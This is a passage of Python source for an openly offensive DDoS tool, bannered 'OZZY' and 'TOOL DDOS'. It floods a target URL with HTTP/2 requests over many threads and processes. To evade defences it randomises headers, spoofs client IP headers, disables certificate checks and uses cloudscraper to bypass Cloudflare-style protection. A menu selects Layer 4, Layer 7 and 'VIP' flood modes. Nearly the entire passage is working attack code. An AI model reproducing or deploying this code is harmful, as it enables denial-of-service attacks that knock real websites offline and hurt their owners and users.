    {"x-permitted-cross-domain-policies": "none"},
    {"surrogate-control": "no-store"},
    {"last-modified": f"{random.randint(1, 28)}-{random.choice(['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'])}-{random.randint(2020, 2024)}"},
    {"etag": generate_random_string(10, 20)},
    {"vary": "Accept-Encoding"},
    {"content-encoding": random.choice(["gzip", "compress", "deflate", "br"])},
    {"x-cache": "HIT from " + generate_random_string(5, 10)},
    {"x-cache-lookup": "HIT from " + generate_random_string(5, 10)},
    {"set-cookie": generate_random_string(15, 25) + "=" + generate_random_string(10, 20) + "; Path=/; HttpOnly"},
    {"x-served-by": generate_random_string(5, 10)},
    {"x-varnish": str(random.randint(1000, 10000)) + " " + str(random.randint(10000, 50000))},
    {"x-varnish-cache": random.choice(["HIT", "MISS"])},
    {"age": str(random.randint(1, 10000))},
    {"x-timer": "S" + str(random.randint(1000000, 9999999)) + "." + str(random.randint(100000, 999999))},
    {"x-akamai-transformed": "9 -" + str(random.randint(100, 1000)) + " " + "pmb=mRUM"},
    {"x-robots-tag": "noindex, nofollow"},
    {"cf-ray": generate_random_string(10, 20) + "-LAX"},
    {"x-amz-cf-id": generate_random_string(20, 30)},
    {"x-amz-request-id": generate_random_string(20, 30)},
    {"x-amz-id-2": generate_random_string(20, 30)},
    {"server": random.choice(["nginx", "Apache", "cloudflare", "Microsoft-IIS/10.0", "LiteSpeed"])},
    {"content-language": random.choice(language_header)},
    {"accept-encoding": random.choice(encoding_header)},
    {"accept-ch": "DPR, Width, Viewport-Width, Downlink, Save-Data"},
    {"save-data": str(random.randint(0, 1))},
    {"x-powered-by": random.choice(["PHP/7.4.3", "ASP.NET", "Express", "Node.js", "Python/3.8"])},
    {"x-origin-cache": random.choice(["HIT", "MISS"])},
    {"x-content-duration": str(random.randint(1000, 10000)) + "ms"},
    {"x-debug-id": generate_random_string(10, 20)},
    {"link": f'<https://{generate_random_string(8, 15)}.com>; rel="preload"; as="script"'},
    {"content-disposition": f'attachment; filename="{generate_random_string(8, 15)}.txt"'},
]

def create_secure_context():
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.set_ciphers(':'.join(cplist))
    context.minimum_version = ssl.TLSVersion.TLSv1_2
    context.maximum_version = ssl.TLSVersion.TLSv1_3

    context.options |= (
        ssl.OP_NO_SSLv2 | 
        ssl.OP_NO_SSLv3 | 
        ssl.OP_NO_COMPRESSION | 
        ssl.OP_NO_TICKET | 
        ssl.OP_NO_RENEGOTIATION
    )
    context.set_alpn_protocols(["h2", "http/1.1"])
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context

def get_cloudscraper_cookies(vic):
    scraper = cloudscraper.create_scraper()
    response = scraper.get(vic)
    if response.status_code == 200:
        logging.info("Cloudscraper successfully bypassed protection.")
        return response.cookies.get_dict()
    else:
        logging.error("Cloudscraper failed to bypass protection.")
        return None

def make_http2_request(vic, stream_id, protocol="https", rq_per_second=None):
    transport = httpx.HTTPTransport(verify=False)
    headers = {
        "pragma": "no-cache",
        "upgrade-insecure-requests": "1",
        "accept-encoding": random.choice(encoding_header),
        "cache-control": random.choice(cache_header),
        "sec-fetch-mode": random.choice(fetch_mode),
        "sec-fetch-site": random.choice(fetch_site),
        "sec-fetch-dest": random.choice(fetch_dest),
        "user-agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(70, 116)}.0.{random.randint(1000, 4000)}.87 Safari/537.36",
        "Connection": "keep-alive",
        "x-forwarded-for": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "referer": "https://" + generate_random_string(5, 10) + ".com",
        "accept-language": random.choice(language_header),
        "x-requested-with": "XMLHttpRequest",
        "sec-ch-ua": f'"Chromium";v="{random.randint(70, 116)}", "Google Chrome";v="{random.randint(70, 116)}", "Not A;Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "x-real-ip": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "dnt": str(random.randint(0, 1)),  # Do Not Track
        "upgrade-insecure-requests": "1",
        "x-frame-options": "DENY",
        "x-xss-protection": "1; mode=block",
        "x-content-type-options": "nosniff",
        "strict-transport-security": "max-age=31536000; includeSubDomains",
        "content-security-policy": "default-src 'self'",
        "x-powered-by": random.choice(["PHP/7.4.3", "ASP.NET", "Express", "Node.js", "Python/3.8"]),
    }


    dyn_headers = {
        **headers,
        **random.choice(random_headers)
    }

    cookies = get_cloudscraper_cookies(vic)
    if cookies:
        dyn_headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in cookies.items()])

    with httpx.Client(http2=True if protocol == "https" else False, transport=transport) as client:
        try:
            response = client.get(vic, headers=dyn_headers)
            logging.info(f"Stream {stream_id} - {protocol.upper()} response status: {response.status_code}")
        except Exception as e:
            logging.error(f"Stream {stream_id} - Error: {str(e)}")

        if rq_per_second:
            time.sleep(1 / rq_per_second)

def send_multiple_requests(vic, num_threads=5, rq_per_second=None):
    protocol = random.choice(["http", "https"]) 
    logging.info(f"Starting attack with {num_threads} threads and {rq_per_second} RQ/s on {vic}")
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for i in range(num_threads):
            executor.submit(make_http2_request, vic, i, protocol, rq_per_second)

def process_task(vic, num_threads, num_processes, rq_per_second):
    with ProcessPoolExecutor(max_workers=num_processes) as executor:
        for _ in range(num_processes):
            executor.submit(send_multiple_requests, vic, num_threads, rq_per_second)
            
def main():
        if os.name == "posix":
            os.system('clear')
        elif os.name == "nt":
            os.system('cls')

    
        print(f"""

        
 {fg(196)}▒█████  ▒███████▒▒███████▒▓██   ██▓
{fg(197)}▒██▒  ██▒▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒
{fg(198)}▒██░  ██▒░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░
{fg(199)}▒██   ██░  ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░
{fg(200)}░ ████▓▒░▒███████▒▒███████▒  ░ ██▒▓░
{fg(201)}░ ▒░▒░▒░ ░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ 
  {fg(201)}░ ▒ ▒░ ░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ 
{fg(201)}░ ░ ░ ▒  ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  
    {fg(201)}░ ░    ░ ░      ░ ░     ░ ░     
         {fg(201)}░        ░         ░ ░    
         """)
        
        print(f"""{fg(206)}          -WELCOME TO OZZY-""")
        print(f"""{fg(207)}             -TOOL DDOS-""")
        print(f"""{fg(208)}    ➢    -MADE BY NGUYEN PHU-""")
        print("\n".join(banner))
        print("\033[1;37m╔═════════════════╗")
        print("\033[1;37m║\033[37m1. LAYER 4       \033[1;37m║")
        print("\033[1;37m║\033[37m2. LAYER 7       \033[1;37m║")
        print("\033[1;37m║\033[37m3. DDOS-WEB-1    \033[1;37m║")
        print("\033[1;37m║\033[37m4. DDOS-WEB-2    \033[1;37m║")
        print("\033[1;37m║\033[37m5. DDOS-WEB-3    \033[1;37m║")
        print("\033[1;37m║\033[93m0. EXIT          \033[1;37m║")
        print("\033[1;37m╚═════════════════╝")
        
    
        mode = input("\x1b[1;37mSELECT MODE : ")
             
    
        if mode == "1":
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
            print("\x1b[38;5;55m╔═════════╗")
            print("\x1b[38;5;55m║ \033[37mLAYER-4 \x1b[38;5;55m║     \x1b[38;5;55m[\x1b[1;37mIP\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mPORT\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mTHREAD\x1b[38;5;55m]")
            print("\x1b[38;5;55m╚═════════╝")
            
            
            
            ip = input("\x1b[1;37mIP Target : ")
            port = int(input("\x1b[1;37mPort : "))
            number_of_threads = int(input("\x1b[1;37mThread : "))
            start_layer4_attack(ip, port, number_of_threads)
        
        if mode == "2":
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
            print("\x1b[38;5;55m╔═════════╗")
            print("\x1b[38;5;55m║ \033[37mLAYER-7 \x1b[38;5;55m║     \x1b[38;5;55m[\x1b[1;37mURL\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mTHREAD\x1b[38;5;55m]")
            print("\x1b[38;5;55m╚═════════╝")
            
            url = input("\x1b[1;37mUrl Target : ")
            number_of_threads = int(input("\x1b[1;37mThread : "))
            start_layer7_attack(url, number_of_threads)

        if mode == "3":
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
            print("\x1b[38;5;55m╔══════════╗")
            print("\x1b[38;5;55m║\033[37mDDOS-VIP-1\x1b[38;5;55m║     \x1b[38;5;55m[\x1b[1;37mURL\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mTHREAD\x1b[38;5;55m]")
            print("\x1b[38;5;55m╚══════════╝")
            print("\x1b[1;93mURL KHÔNG GHI [HTTPS] HOẶC [HTTP] CHỈ GHI TÊN WEB")
           
            url = input("\x1b[1;37mUrl Target : ")
            number_of_threads = int(input("\x1b[1;37mThread : "))
            start_ddos_web_vip(url, number_of_threads)

        if mode == "4":
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
            print("\x1b[38;5;55m╔══════════╗")
            print("\x1b[38;5;55m║\033[37mDDOS-VIP-2\x1b[38;5;55m║     \x1b[38;5;55m[\x1b[1;37mURL\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mTIME\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mTHREAD\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mRQ/S\x1b[38;5;55m]")
            print("\x1b[38;5;55m╚══════════╝")
            url = input("\033[1;31;40mUrl Target: \033[1;37m")
            duration = int(input("\033[1;31;40mTime: \033[1;37m"))
            num_threads = int(input("\033[1;31;40mThread: \033[1;37m"))
            global requests_per_second
            requests_per_second = int(input("\033[1;31;40mRQ/S: \033[1;37m"))
            get_status(url)
            threads = []
            for _ in range(num_threads):
                thread = threading.Thread(target=worker, args=(url, duration))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()

        if mode == "5":
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
            print("\x1b[38;5;55m╔══════════╗")
            print("\x1b[38;5;55m║\033[37mDDOS-VIP-3\x1b[38;5;55m║     \x1b[38;5;55m[\x1b[1;37mURL\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mTHREAD\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mPROCESS\x1b[38;5;55m]    \x1b[38;5;55m[\x1b[1;37mRQ/S\x1b[38;5;55m]")
            print("\x1b[38;5;55m╚══════════╝")
            vic = input("\033[1;31;40mUrl Target: \033[1;37m")
            num_threads = int(input("\033[1;31;40mThread: \033[1;37m"))
            num_processes = int(input("\033[1;31;40mProcess: \033[1;37m"))
            rq_per_second = int(input("\033[1;31;40mRQ/S: \033[1;37m"))
            process_task(vic, num_threads, num_processes, rq_per_second)

        if mode == "0":
            if os.name == "posix":
                os.system('clear')
            elif os.name == "nt":
                os.system('cls')
            print("\x1b[38;5;55m╔══════╗")
            print("\x1b[38;5;55m║ \033[37mEXIT \x1b[38;5;55m║")
            print("\x1b[38;5;55m╚══════╝")
            exit()
        else:
            print("\x1b[1;31mInvalid Mode! Please Seclect Again!")
            time.sleep(1)
            main()

if __name__ == "__main__":
     main()
